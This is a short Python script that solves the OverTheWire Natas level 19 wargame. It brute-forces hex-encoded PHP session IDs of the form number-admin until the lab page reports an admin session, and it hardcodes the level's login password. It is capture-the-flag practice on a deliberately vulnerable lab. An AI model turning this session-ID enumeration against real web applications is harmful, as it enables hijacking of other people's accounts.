#!/usr/bin/env python3

# In this chall we have given a login form and a phpsession id which is encoded in hex 
# format {range_0-640}-user_name
# simply brute id with admin username

import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org/"
auth_user = 'natas19'
auth_pass = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr' 

for prefix in range(1, 641):  
    session_str = f"{prefix}-admin"
    session_id_hex = binascii.hexlify(session_str.encode()).decode()
    
    cookies = {"PHPSESSID": session_id_hex}
    response = requests.get(url, auth=(auth_user, auth_pass), cookies=cookies)
    
    if "You are an admin" in response.text:
        print(f"Admin session found with prefix {prefix}!")
        print(response.text)
        break
else:
    print("Admin session not found within the given range.")
